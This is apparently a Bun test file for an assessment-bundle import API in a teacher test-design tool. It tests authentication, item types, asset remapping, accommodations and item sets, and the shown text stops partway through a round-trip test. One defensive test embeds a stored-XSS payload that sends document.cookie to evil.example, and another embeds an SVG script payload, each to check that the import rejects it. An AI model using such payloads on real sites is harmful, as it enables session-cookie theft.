import { afterAll, afterEach, beforeAll, describe, expect, mock, test } from "bun:test";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { asc, eq, sql } from "drizzle-orm";
import { closeDb, getDb } from "../db/client";
import { item_sets, items } from "../db/schema";
import { SESSION_COOKIE_NAME } from "../lib/auth/session";
import * as sessionMod from "../lib/auth/session";

const expectTestDb = () => {
  const url = process.env.DATABASE_URL ?? "";
  if (!url.includes("secure_test_design_tool_test")) {
    throw new Error(`import-api tests require the test DB DATABASE_URL; got: ${url}`);
  }
};

let originalSessionSecret: string | undefined;
let mockSub: string | null = null;

mock.module("next/headers", () => ({
  // Slice 58: requireSession now reads an Authorization bearer header as
  // well as the cookie, so the mocked module has to provide headers().
  headers: async () => new Headers(),
  cookies: async () => ({
    get: (name: string) => (mockSub && name === SESSION_COOKIE_NAME ? { value: "x" } : undefined),
  }),
}));

mock.module("../lib/auth/session", () => ({
  ...sessionMod,
  readSessionFromCookies: async () =>
    mockSub ? { sub: mockSub, role: "staff" } : null,
}));

function asUser(sub: string | null) {
  mockSub = sub;
}

beforeAll(() => {
  expectTestDb();
  originalSessionSecret = process.env.DESIGN_TOOL_SESSION_SECRET;
  process.env.DESIGN_TOOL_SESSION_SECRET = "test-session-secret-do-not-use";
});

afterEach(async () => {
  const db = getDb();
  await db.execute(sql`truncate table assessments restart identity cascade`);
  await db.execute(sql`truncate table assets restart identity cascade`);
});

afterAll(async () => {
  await closeDb();
  if (originalSessionSecret === undefined) {
    delete process.env.DESIGN_TOOL_SESSION_SECRET;
  } else {
    process.env.DESIGN_TOOL_SESSION_SECRET = originalSessionSecret;
  }
});

async function postImport(body: unknown) {
  const { POST } = await import("../app/api/assessments/import/route");
  const req = new Request("http://localhost/api/assessments/import", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: typeof body === "string" ? body : JSON.stringify(body),
  });
  return POST(req);
}

describe("POST /api/assessments/import", () => {
  test("requires a session", async () => {
    asUser(null);
    const res = await postImport({
      test_id: "x",
      title: "x",
      items: [],
    });
    expect(res.status).toBe(401);
  });

  test("imports PoC-B's live items.json fixture", async () => {
    asUser("teacher-1");
    const fixturePath = resolve(
      import.meta.dir,
      "../../poc-b-test-loop/client/Sources/PocBClient/Resources/items.json",
    );
    const raw = readFileSync(fixturePath, "utf8");
    const res = await postImport(raw);
    expect(res.status).toBe(201);
    const body = (await res.json()) as {
      assessment: { id: string; name: string; owner_sub: string };
      item_count: number;
    };
    expect(body.assessment.owner_sub).toBe("teacher-1");
    expect(body.assessment.name).toBe("PoC-B sample assessment");
    // Slice 8 extended the fixture with multi-select + short-text items
    // (5 total); slice 13 added two math-bearing items (now 7 total).
    // Any future fixture growth should bump this count rather than
    // pinning at a number that ages out.
    expect(body.item_count).toBe(7);

    const db = getDb();
    const rows = await db.execute(
      sql`select position, type, stem from items where assessment_id = ${body.assessment.id} order by position`,
    );
    expect(rows.length).toBe(7);
    expect(rows[0]!.position).toBe(0);
    expect(rows[0]!.type).toBe("multiple_choice_single");
    expect(rows[0]!.stem).toBe("What is 7 + 5?");

    const types = rows.map((r) => r.type).sort();
    expect(types).toEqual([
      "multiple_choice_multi",
      "multiple_choice_single",
      "multiple_choice_single",
      "multiple_choice_single",
      "multiple_choice_single",
      "short_text",
      "short_text",
    ]);
  });

  // 2026-09-02: a second import of the same bundle by the same owner is
  // named "(copy)", a third "(copy 2)"; another owner keeps the plain title.
  test("an imported copy takes a unique name for its owner", async () => {
    asUser("teacher-1");
    const fixturePath = resolve(
      import.meta.dir,
      "../../poc-b-test-loop/client/Sources/PocBClient/Resources/items.json",
    );
    const raw = readFileSync(fixturePath, "utf8");
    const names: string[] = [];
    for (let i = 0; i < 3; i++) {
      const res = await postImport(raw);
      expect(res.status).toBe(201);
      names.push(((await res.json()) as { assessment: { name: string } }).assessment.name);
    }
    expect(names).toEqual([
      "PoC-B sample assessment",
      "PoC-B sample assessment (copy)",
      "PoC-B sample assessment (copy 2)",
    ]);
    asUser("teacher-2");
    const other = await postImport(raw);
    expect(((await other.json()) as { assessment: { name: string } }).assessment.name).toBe("PoC-B sample assessment");
  });

  test("imports a hand-built bundle exercising all three item types (slice 8)", async () => {
    asUser("teacher-1");
    const res = await postImport({
      test_id: "mixed",
      title: "Mixed-type bundle",
      items: [
        {
          id: "q1",
          stem: "Pick the largest planet",
          choices: [
            { id: "j", text: "Jupiter" },
            { id: "s", text: "Saturn" },
            { id: "n", text: "Neptune" },
          ],
          correct_choice_id: "j",
        },
        {
          type: "multiple_choice_multi",
          id: "q2",
          stem: "Pick the primary colors",
          choices: [
            { id: "r", text: "Red" },
            { id: "g", text: "Green" },
            { id: "b", text: "Blue" },
            { id: "y", text: "Yellow" },
          ],
          correct_choice_ids: ["r", "b", "y"],
        },
        {
          type: "short_text",
          id: "q3",
          stem: "Capital of WA?",
          correct_answer: "Olympia",
        },
      ],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as { assessment: { id: string }; item_count: number };
    expect(body.item_count).toBe(3);

    const db = getDb();
    const rows = await db.execute(
      sql`select type, correct_choice_ids, correct_answer from items where assessment_id = ${body.assessment.id} order by position`,
    );
    expect(rows.map((r) => r.type)).toEqual([
      "multiple_choice_single",
      "multiple_choice_multi",
      "short_text",
    ]);
    expect(rows[2]!.correct_answer).toBe("Olympia");
  });

  test("round-trips bundled assets and remaps uuids in stems (slice 15)", async () => {
    asUser("teacher-1");
    const incomingUuid = "11111111-1111-1111-1111-111111111111";
    // Tiny 1x1 PNG; the precise bytes don't matter, just that round-trip
    // preserves them.
    const png = new Uint8Array([
      137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82,
      0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0, 31, 21, 196, 137,
      0, 0, 0, 13, 73, 68, 65, 84, 120, 156, 99, 0, 1, 0, 0, 5,
      0, 1, 13, 10, 45, 180, 0, 0, 0, 0, 73, 69, 78, 68, 174, 66, 96, 130,
    ]);
    const base64 = Buffer.from(png).toString("base64");
    const res = await postImport({
      test_id: "with-bundle",
      title: "Bundled image test",
      items: [
        {
          id: "q1",
          stem: `See ![pixel](asset:${incomingUuid}) below.`,
          choices: [
            { id: "a", text: "yes" },
            { id: "b", text: "no" },
          ],
          correct_choice_id: "a",
        },
      ],
      assets: {
        [incomingUuid]: { content_type: "image/png", base64 },
      },
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as {
      assessment: { id: string };
      assets_imported: number;
      assets_reused: number;
    };
    expect(body.assets_imported).toBe(1);
    expect(body.assets_reused).toBe(0);

    // The asset got a new uuid in the importer's account, and the stem
    // was rewritten to point at it.
    const db = getDb();
    const itemRows = await db.execute(
      sql`select stem from items where assessment_id = ${body.assessment.id}`,
    );
    const stem = itemRows[0]!.stem as string;
    expect(stem).not.toContain(`asset:${incomingUuid}`);
    expect(stem).toMatch(/asset:[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/);

    // Re-importing the same bundle dedupes against the existing asset
    // row (same sha256 + same owner_sub) — assets_reused goes up.
    const second = await postImport({
      test_id: "with-bundle-2",
      title: "Bundled image test 2",
      items: [],
      assets: {
        [incomingUuid]: { content_type: "image/png", base64 },
      },
    });
    expect(second.status).toBe(201);
    const secondBody = (await second.json()) as {
      assets_imported: number;
      assets_reused: number;
    };
    expect(secondBody.assets_imported).toBe(0);
    expect(secondBody.assets_reused).toBe(1);
  });

  // B3: a bundle is untrusted teacher-to-teacher input. Import used to insert
  // the bundle's content_type verbatim, and /api/assets/[id] serves those
  // bytes inline on the app origin — so a bundle declaring "text/html" was a
  // stored-XSS delivery vehicle against the importing teacher's session.
  test("rejects a bundled asset whose content_type is not an allowed image (B3)", async () => {
    asUser("teacher-1");
    const uuid = "22222222-2222-2222-2222-222222222222";
    const html = Buffer.from(
      "<script>fetch('https://evil.example/'+document.cookie)</script>",
    ).toString("base64");
    const res = await postImport({
      test_id: "xss-bundle",
      title: "Malicious bundle",
      items: [],
      assets: { [uuid]: { content_type: "text/html", base64: html } },
    });
    expect(res.status).toBe(400);
    const body = (await res.json()) as { error: string };
    expect(body.error).toBe("asset_content_type_not_allowed");

    // Nothing was written — not the storage object, not the DB row.
    const db = getDb();
    const rows = await db.execute(sql`select count(*)::int as n from assets`);
    expect((rows[0] as { n: number }).n).toBe(0);
  });

  test("rejects a bundled SVG asset (B3 + B7)", async () => {
    asUser("teacher-1");
    const uuid = "33333333-3333-3333-3333-333333333333";
    const svg = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    ).toString("base64");
    const res = await postImport({
      test_id: "svg-bundle",
      title: "SVG bundle",
      items: [],
      assets: { [uuid]: { content_type: "image/svg+xml", base64: svg } },
    });
    expect(res.status).toBe(400);
    const body = (await res.json()) as { error: string };
    expect(body.error).toBe("asset_content_type_not_allowed");
  });

  test("rejects invalid JSON", async () => {
    asUser("teacher-1");
    const res = await postImport("not-json{");
    expect(res.status).toBe(400);
    const body = (await res.json()) as { error: string };
    expect(body.error).toBe("invalid_json");
  });

  test("rejects schema-invalid JSON (missing title)", async () => {
    asUser("teacher-1");
    const res = await postImport({
      test_id: "x",
      items: [],
    });
    expect(res.status).toBe(400);
    const body = (await res.json()) as { error: string };
    expect(body.error).toBe("schema_invalid");
  });

  test("rejects a bundle whose item omits required choices", async () => {
    asUser("teacher-1");
    const res = await postImport({
      test_id: "x",
      title: "x",
      items: [
        { id: "q1", stem: "missing choices", choices: [] },
      ],
    });
    expect(res.status).toBe(400);
  });

  test("rejects oversize body (>50 MB; slice-15 cap raise)", async () => {
    asUser("teacher-1");
    // Build a body that exceeds the 50 MB cap. A single very long string
    // is the cheapest way; stem length is unbounded at the schema layer
    // so this fails on the body-size guard, not on Zod validation.
    const bigStem = "x".repeat(50 * 1024 * 1024 + 1024);
    const res = await postImport({
      test_id: "x",
      title: "x",
      items: [
        {
          id: "q1",
          stem: bigStem,
          choices: [
            { id: "a", text: "a" },
            { id: "b", text: "b" },
          ],
          correct_choice_id: "a",
        },
      ],
    });
    expect(res.status).toBe(413);
  });

  test("import creates exactly one assessment row (transactional)", async () => {
    asUser("teacher-1");
    const before = await (await import("../db/client"))
      .getDb()
      .execute(sql`select count(*)::int as n from assessments`);
    const beforeN = Number(before[0]!.n);
    await postImport({
      test_id: "tx",
      title: "tx-test",
      items: [
        {
          id: "q1",
          stem: "?",
          choices: [
            { id: "a", text: "a" },
            { id: "b", text: "b" },
          ],
          correct_choice_id: "a",
        },
      ],
    });
    const after = await (await import("../db/client"))
      .getDb()
      .execute(sql`select count(*)::int as n from assessments`);
    expect(Number(after[0]!.n) - beforeN).toBe(1);
  });
});

describe("slice 21 — accommodations round-trip on import", () => {
  test("persists allowed_accommodations + construct_altering from the bundle", async () => {
    asUser("teacher-1");
    const res = await postImport({
      test_id: "with-accoms",
      title: "with-accoms",
      items: [],
      allowed_accommodations: ["color_contrast", "tts_for_ela_reading"],
      construct_altering: ["tts_for_ela_reading"],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as {
      assessment: {
        id: string;
        allowed_accommodations: string[];
        construct_altering: string[];
      };
      accommodations_imported: number;
      accommodations_dropped: number;
      construct_altering_imported: number;
      construct_altering_dropped: number;
    };
    expect([...body.assessment.allowed_accommodations].sort()).toEqual([
      "color_contrast",
      "tts_for_ela_reading",
    ]);
    expect(body.assessment.construct_altering).toEqual([
      "tts_for_ela_reading",
    ]);
    expect(body.accommodations_imported).toBe(2);
    expect(body.accommodations_dropped).toBe(0);
    expect(body.construct_altering_imported).toBe(1);
    expect(body.construct_altering_dropped).toBe(0);
  });

  test("drops unknown ids leniently and reports the count", async () => {
    asUser("teacher-1");
    const res = await postImport({
      test_id: "drift",
      title: "catalog-drift",
      items: [],
      allowed_accommodations: ["color_contrast", "not_a_real_tool"],
      construct_altering: ["also_made_up"],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as {
      assessment: { allowed_accommodations: string[]; construct_altering: string[] };
      accommodations_imported: number;
      accommodations_dropped: number;
      construct_altering_imported: number;
      construct_altering_dropped: number;
    };
    expect(body.assessment.allowed_accommodations).toEqual(["color_contrast"]);
    expect(body.assessment.construct_altering).toEqual([]);
    expect(body.accommodations_imported).toBe(1);
    expect(body.accommodations_dropped).toBe(1);
    expect(body.construct_altering_imported).toBe(0);
    expect(body.construct_altering_dropped).toBe(1);
  });

  test("clamps construct_altering to allowed_accommodations (lenient, not 400)", async () => {
    asUser("teacher-1");
    // Bundle's construct_altering contains an id not in
    // allowed_accommodations — known-good per catalog, but a subset
    // violation. Import should drop it from CA, not 400.
    const res = await postImport({
      test_id: "clamp",
      title: "clamp-on-import",
      items: [],
      allowed_accommodations: ["color_contrast"],
      construct_altering: ["tts_for_ela_reading"],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as {
      assessment: { allowed_accommodations: string[]; construct_altering: string[] };
      construct_altering_imported: number;
      construct_altering_dropped: number;
    };
    expect(body.assessment.allowed_accommodations).toEqual(["color_contrast"]);
    expect(body.assessment.construct_altering).toEqual([]);
    expect(body.construct_altering_imported).toBe(0);
    expect(body.construct_altering_dropped).toBe(1);
  });

  test("bundle without accommodations fields → empty arrays in the row", async () => {
    asUser("teacher-1");
    const res = await postImport({
      test_id: "no-accoms",
      title: "no-accoms",
      items: [],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as {
      assessment: {
        allowed_accommodations: string[];
        construct_altering: string[];
      };
      accommodations_imported: number;
      accommodations_dropped: number;
    };
    expect(body.assessment.allowed_accommodations).toEqual([]);
    expect(body.assessment.construct_altering).toEqual([]);
    expect(body.accommodations_imported).toBe(0);
    expect(body.accommodations_dropped).toBe(0);
  });
});

// Slice 46: version-skew guard. ItemBundleSchema rejects unknown types at
// the route today, so this exercises importBundleForOwner directly with a
// forged bundle — standing in for a newer @secure-test/schema whose union
// grew a type this server's import branches don't handle. The item must be
// skipped per-item and reported, never silently imported as short_text.
describe("importBundleForOwner dispatch hardening (slice 46)", () => {
  test("unknown-type item is skipped + reported; known items still import", async () => {
    asUser("import-skew-teacher");
    const { importBundleForOwner, isImportBundleError } = await import(
      "../lib/api/importBundle"
    );
    const bundle = {
      test_id: "00000000-0000-0000-0000-00000000abcd",
      title: "Skew bundle",
      items: [
        { type: "short_text", stem: "Known type", correct_answer: "ok" },
        { type: "matching_v2", stem: "From a newer schema" },
      ],
    } as unknown as Parameters<typeof importBundleForOwner>[0];
    const result = await importBundleForOwner(bundle, "import-skew-teacher");
    expect(isImportBundleError(result)).toBe(false);
    if (isImportBundleError(result)) return;
    expect(result.items_skipped_unknown_type).toBe(1);
    expect(result.item_count).toBe(1);
    const db = getDb();
    const rows = (await db.execute(
      sql`select type, stem from items where assessment_id = ${result.assessment_id}`,
    )) as unknown as { type: string; stem: string }[];
    expect(rows).toHaveLength(1);
    expect(rows[0]!.type).toBe("short_text");
    expect(rows[0]!.stem).toBe("Known type");
  });
});

// Slice 47: match items import into config.pairs.
describe("bundle import of match items (slice 47)", () => {
  test("imports a match item with its pairs", async () => {
    asUser("import-match-teacher");
    const res = await postImport({
      test_id: "match-bundle",
      title: "Match import",
      items: [
        {
          type: "match",
          id: "m1",
          stem: "Match each animal to its sound",
          pairs: [
            { id: "p1", left: "Dog", right: "Woof" },
            { id: "p2", left: "Cat", right: "Meow" },
          ],
        },
      ],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as {
      assessment: { id: string };
      item_count: number;
    };
    expect(body.item_count).toBe(1);
    const db = getDb();
    const rows = (await db.execute(
      sql`select type, config from items where assessment_id = ${body.assessment.id}`,
    )) as unknown as { type: string; config: { pairs?: unknown } }[];
    expect(rows).toHaveLength(1);
    expect(rows[0]!.type).toBe("match");
    expect(rows[0]!.config.pairs).toEqual([
      { id: "p1", left: "Dog", right: "Woof" },
      { id: "p2", left: "Cat", right: "Meow" },
    ]);
  });
});

// Slice 48: order items import into config.sequence.
describe("bundle import of order items (slice 48)", () => {
  test("imports an order item with its sequence", async () => {
    asUser("import-order-teacher");
    const res = await postImport({
      test_id: "order-bundle",
      title: "Order import",
      items: [
        {
          type: "order",
          id: "o1",
          stem: "Put the steps in order",
          sequence: [
            { id: "s1", label: "First" },
            { id: "s2", label: "Second" },
          ],
        },
      ],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as {
      assessment: { id: string };
      item_count: number;
    };
    expect(body.item_count).toBe(1);
    const db = getDb();
    const rows = (await db.execute(
      sql`select type, config from items where assessment_id = ${body.assessment.id}`,
    )) as unknown as { type: string; config: { sequence?: unknown } }[];
    expect(rows).toHaveLength(1);
    expect(rows[0]!.type).toBe("order");
    expect(rows[0]!.config.sequence).toEqual([
      { id: "s1", label: "First" },
      { id: "s2", label: "Second" },
    ]);
  });
});

// Slice 49: hotspot items — config import + image remap through the
// bundle's assets map (same machinery as stem refs, keyed by config id).
describe("bundle import of hotspot items (slice 49)", () => {
  test("imports regions/key and remaps the bundled image to the new uuid", async () => {
    asUser("import-hotspot-teacher");
    const incomingUuid = "44444444-4444-4444-4444-444444444444";
    const png = new Uint8Array([
      137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82,
      0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0, 31, 21, 196, 137,
      0, 0, 0, 13, 73, 68, 65, 84, 120, 156, 99, 0, 1, 0, 0, 5,
      0, 1, 13, 10, 45, 180, 0, 0, 0, 0, 73, 69, 78, 68, 174, 66, 96, 130,
    ]);
    const res = await postImport({
      test_id: "hotspot-bundle",
      title: "Hotspot import",
      items: [
        {
          type: "hotspot",
          id: "h1",
          stem: "Mark it",
          image_asset_id: incomingUuid,
          regions: [{ id: "r1", x: 0.2, y: 0.2, w: 0.4, h: 0.4 }],
          correct_region_ids: ["r1"],
        },
      ],
      assets: {
        [incomingUuid]: {
          content_type: "image/png",
          base64: Buffer.from(png).toString("base64"),
        },
      },
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as {
      assessment: { id: string };
      assets_imported: number;
    };
    expect(body.assets_imported).toBe(1);
    const db = getDb();
    const rows = (await db.execute(
      sql`select config from items where assessment_id = ${body.assessment.id}`,
    )) as unknown as {
      config: { image_asset_id?: string; regions?: unknown; correct_region_ids?: unknown };
    }[];
    expect(rows).toHaveLength(1);
    // Remapped to the importer's copy — not the incoming uuid.
    expect(rows[0]!.config.image_asset_id).toBeDefined();
    expect(rows[0]!.config.image_asset_id).not.toBe(incomingUuid);
    expect(rows[0]!.config.regions).toEqual([{ id: "r1", x: 0.2, y: 0.2, w: 0.4, h: 0.4 }]);
    expect(rows[0]!.config.correct_region_ids).toEqual(["r1"]);
  });
});

// Slice 50: drawing_upload imports its authoring metadata.
describe("bundle import of drawing_upload items (slice 50)", () => {
  test("imports prompt ref + canvas into config", async () => {
    asUser("import-drawing-teacher");
    const res = await postImport({
      test_id: "drawing-bundle",
      title: "Drawing import",
      items: [
        {
          type: "drawing_upload",
          id: "d1",
          stem: "Draw it",
          prompt_asset_id: "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
          canvas: { width: 640, height: 480 },
        },
      ],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as { assessment: { id: string } };
    const db = getDb();
    const rows = (await db.execute(
      sql`select type, config from items where assessment_id = ${body.assessment.id}`,
    )) as unknown as {
      type: string;
      config: { prompt_asset_id?: string; canvas?: unknown };
    }[];
    expect(rows).toHaveLength(1);
    expect(rows[0]!.type).toBe("drawing_upload");
    // Unbundled ref is kept as-is (renders as missing, same as stem refs).
    expect(rows[0]!.config.prompt_asset_id).toBe("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa");
    expect(rows[0]!.config.canvas).toEqual({ width: 640, height: 480 });
  });

  // Drawing background (docs/drawing-background-design.md): no import/export
  // code change — canvas travels whole — so these prove the schema lets the
  // new sub-field through both ways rather than stripping it silently.
  test("canvas.background round-trips through import", async () => {
    asUser("import-drawing-bg-teacher");
    const res = await postImport({
      test_id: "drawing-bg-bundle",
      title: "Drawing background import",
      items: [
        {
          type: "drawing_upload",
          id: "d1",
          stem: "Graph it",
          canvas: { width: 800, height: 600, background: "axes" },
        },
      ],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as { assessment: { id: string } };
    const db = getDb();
    const rows = (await db.execute(
      sql`select config from items where assessment_id = ${body.assessment.id}`,
    )) as unknown as { config: { canvas?: unknown } }[];
    expect(rows[0]!.config.canvas).toEqual({ width: 800, height: 600, background: "axes" });
  });

  test("an older bundle with no background imports as blank", async () => {
    asUser("import-drawing-nobg-teacher");
    const res = await postImport({
      test_id: "drawing-nobg-bundle",
      title: "Drawing legacy import",
      items: [
        {
          type: "drawing_upload",
          id: "d1",
          stem: "Sketch it",
          canvas: { width: 800, height: 600 },
        },
      ],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as { assessment: { id: string } };
    const db = getDb();
    const rows = (await db.execute(
      sql`select config from items where assessment_id = ${body.assessment.id}`,
    )) as unknown as {
      config: { canvas?: { width: number; height: number; background?: string } };
    }[];
    expect(rows[0]!.config.canvas).toEqual({ width: 800, height: 600 });
    expect(rows[0]!.config.canvas?.background).toBeUndefined();
  });
});

// Code-review fix (2026-08-14): non-uuid config asset refs are dropped at
// import — stored verbatim they made the item un-saveable (PATCH requires
// uuid) and 22P02'd the preview/export asset query.
describe("import drops non-uuid config asset refs", () => {
  test("drawing prompt ref 'ref-1' is dropped; canvas survives", async () => {
    asUser("import-baddref-teacher");
    const res = await postImport({
      test_id: "bad-ref-bundle",
      title: "Bad ref",
      items: [
        {
          type: "drawing_upload",
          id: "d1",
          stem: "Draw it",
          prompt_asset_id: "ref-1",
          canvas: { width: 640, height: 480 },
        },
      ],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as { assessment: { id: string } };
    const db = getDb();
    const rows = (await db.execute(
      sql`select config from items where assessment_id = ${body.assessment.id}`,
    )) as unknown as { config: { prompt_asset_id?: string; canvas?: unknown } }[];
    expect(rows[0]!.config.prompt_asset_id).toBeUndefined();
    expect(rows[0]!.config.canvas).toEqual({ width: 640, height: 480 });
  });

  test("hotspot image ref that isn't uuid-shaped is dropped; regions survive", async () => {
    asUser("import-badhref-teacher");
    const res = await postImport({
      test_id: "bad-href-bundle",
      title: "Bad hotspot ref",
      items: [
        {
          type: "hotspot",
          id: "h1",
          stem: "Mark it",
          image_asset_id: "not-a-uuid-at-all",
          regions: [{ id: "r1", x: 0.1, y: 0.1, w: 0.2, h: 0.2 }],
          correct_region_ids: ["r1"],
        },
      ],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as { assessment: { id: string } };
    const db = getDb();
    const rows = (await db.execute(
      sql`select config from items where assessment_id = ${body.assessment.id}`,
    )) as unknown as { config: { image_asset_id?: string; regions?: unknown[] } }[];
    expect(rows[0]!.config.image_asset_id).toBeUndefined();
    expect(rows[0]!.config.regions).toHaveLength(1);
  });
});

// Review fix (2026-08-14): the import report counts scoring methods the
// clamp dropped instead of silently landing items on their defaults.
describe("scoring_methods_dropped reporting (review fix)", () => {
  test("hybrid-without-rubric essay reports the drop", async () => {
    asUser("import-clamp-teacher");
    const res = await postImport({
      test_id: "clamp-bundle",
      title: "Clamp report",
      items: [
        { type: "essay", id: "e1", stem: "No rubric", scoring_method: "hybrid" },
        { type: "short_text", id: "s1", stem: "Fine", correct_answer: "ok" },
      ],
    });
    expect(res.status).toBe(201);
    const body = (await res.json()) as {
      assessment: { id: string };
      scoring_methods_dropped: number;
    };
    expect(body.scoring_methods_dropped).toBe(1);
    const db = getDb();
    const rows = (await db.execute(
      sql`select config from items where assessment_id = ${body.assessment.id} order by position`,
    )) as unknown as { config: { scoring_method?: string } }[];
    expect(rows[0]!.config.scoring_method).toBeUndefined();
  });
});

// E5 slice 1: item sets round-trip through import — recreated on the copy
// with the new item ids, stimulus asset refs remapped like stem refs.
describe("item sets on import (E5 slice 1)", () => {
  test("recreates each set on the imported assessment's new items", async () => {
    const res = await postImport({
      test_id: "sets",
      title: "With sets",
      items: [
        { type: "essay", id: "a", stem: "A" },
        { type: "essay", id: "b", stem: "B" },
        { type: "essay", id: "c", stem: "C" },
        { type: "essay", id: "d", stem: "D" },
      ],
      item_sets: [
        { id: "s1", stimulus: "Passage one", layout: "own_page", item_ids: ["b", "c"] },
        { id: "s2", stimulus: "Figure", item_ids: ["d"] },
      ],
    });
    expect(res.status).toBe(201);
    const { assessment } = (await res.json()) as { assessment: { id: string } };
    const assessment_id = assessment.id;
    const db = getDb();
    const rows = await db
      .select({ stem: items.stem, position: items.position, item_set_id: items.item_set_id })
      .from(items)
      .where(eq(items.assessment_id, assessment_id))
      .orderBy(asc(items.position));
    expect(rows.map((r) => r.stem)).toEqual(["A", "B", "C", "D"]);
    expect(rows[0]!.item_set_id).toBeNull();
    expect(rows[1]!.item_set_id).toBe(rows[2]!.item_set_id!);
    expect(rows[3]!.item_set_id).not.toBeNull();
    expect(rows[3]!.item_set_id).not.toBe(rows[1]!.item_set_id);
    const sets = await db.select().from(item_sets).where(eq(item_sets.assessment_id, assessment_id));
    expect(sets.map((s) => [s.stimulus_text, s.layout]).sort()).toEqual([
      ["Figure", "inline"],
      ["Passage one", "own_page"],
    ]);
  });

  // E12 slice 1: a set's source link survives import only when this owner
  // owns the source assessment and the question is essay / short_text.
  test("keeps a set source the owner owns; drops one they do not, and counts it", async () => {
    asUser("teacher-1");
    const outline = await postImport({
      test_id: "outline",
      title: "Outline",
      items: [{ type: "essay", id: "o1", stem: "Outline" }, { type: "multiple_choice_single", id: "m1", stem: "Pick", choices: [{ id: "a", text: "A" }, { id: "b", text: "B" }], correct_choice_id: "a" }],
    });
    const outlineId = ((await outline.json()) as { assessment: { id: string } }).assessment.id;
    const db = getDb();
    const outlineItems = await db.select({ id: items.id, type: items.type }).from(items).where(eq(items.assessment_id, outlineId));
    const essayId = outlineItems.find((i) => i.type === "essay")!.id;
    const mcId = outlineItems.find((i) => i.type === "multiple_choice_single")!.id;
    const essay = await postImport({
      test_id: "essay",
      title: "Essay",
      items: [{ type: "essay", id: "e1", stem: "Write" }, { type: "essay", id: "e2", stem: "More" }],
      item_sets: [
        { id: "s1", stimulus: "Your outline:", item_ids: ["e1"], source: { assessment_id: outlineId, item_id: essayId } },
        { id: "s2", stimulus: "Bad source", item_ids: ["e2"], source: { assessment_id: outlineId, item_id: mcId } },
      ],
    });
    expect(essay.status).toBe(201);
    const body = (await essay.json()) as { assessment: { id: string }; sources_dropped: number };
    expect(body.sources_dropped).toBe(1);
    const sets = await db.select().from(item_sets).where(eq(item_sets.assessment_id, body.assessment.id));
    expect(sets.map((s) => [s.stimulus_text, s.source_item_id]).sort()).toEqual([["Bad source", null], ["Your outline:", essayId]]);

    asUser("teacher-2");
    const copy = await postImport({
      test_id: "essay-copy",
      title: "Essay copy",
      items: [{ type: "essay", id: "e1", stem: "Write" }],
      item_sets: [{ id: "s1", stimulus: "Your outline:", item_ids: ["e1"], source: { assessment_id: outlineId, item_id: essayId } }],
    });
    const copyBody = (await copy.json()) as { assessment: { id: string }; sources_dropped: number };
    expect(copyBody.sources_dropped).toBe(1);
    const copySets = await db.select().from(item_sets).where(eq(item_sets.assessment_id, copyBody.assessment.id));
    expect(copySets[0]!.source_item_id).toBeNull();
  });

  // Multi-source stimulus slice 2 (docs/multi-source-stimulus-design.md):
  // sources ride the teacher bundle, and a figure inside a source remaps to
  // the copy's own asset row exactly as one in the introduction does.
  test("recreates a set's sources, remapping an asset ref inside one of them", async () => {
    asUser("teacher-1");
    const incomingUuid = "22222222-2222-2222-2222-222222222222";
    const png = new Uint8Array([
      137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82,
      0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0, 31, 21, 196, 137,
      0, 0, 0, 13, 73, 68, 65, 84, 120, 156, 99, 0, 1, 0, 0, 5,
      0, 1, 13, 10, 45, 180, 0, 0, 0, 0, 73, 69, 78, 68, 174, 66, 96, 130,
    ]);
    const res = await postImport({
      test_id: "sourced",
      title: "With sources",
      items: [{ type: "essay", id: "e1", stem: "Synthesise the sources." }],
      item_sets: [{
        id: "s1",
        stimulus: "Use all the sources.",
        layout: "side_by_side",
        sources: [
          { label: "Source A", text: "Two roads diverged\nin a yellow wood" },
          { label: "Source B", text: `See ![chart](asset:${incomingUuid}) for the trend.` },
        ],
        item_ids: ["e1"],
      }],
      assets: { [incomingUuid]: { content_type: "image/png", base64: Buffer.from(png).toString("base64") } },
    });
    expect(res.status).toBe(201);
    const { assessment } = (await res.json()) as { assessment: { id: string } };
    const db = getDb();
    const [set] = await db.select().from(item_sets).where(eq(item_sets.assessment_id, assessment.id));
    expect(set!.layout).toBe("side_by_side");
    const sources = set!.sources;
    expect(sources.map((s) => s.label)).toEqual(["Source A", "Source B"]);
    expect(sources[0]!.text).toContain("\n");
    expect(sources[1]!.text).not.toContain(`asset:${incomingUuid}`);
    expect(sources[1]!.text).toMatch(/asset:[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/);
  });

  test("export emits the sources and the layout, and a re-import round-trips them", async () => {
    asUser("teacher-1");
    const first = await postImport({
      test_id: "sourced-rt",
      title: "Round trip",
      items: [{ type: "essay", id: "e1", stem: "Synthesise." }],
      item_sets: [{
        id: "s1",
        stimulus: "Use all the sources.",
        layout: "side_by_side",
        sources: [{ label: "Source A", text: "A poem." }, { label: "Source B", text: "An article." }],
        item_ids: ["e1"],
      }],
    });
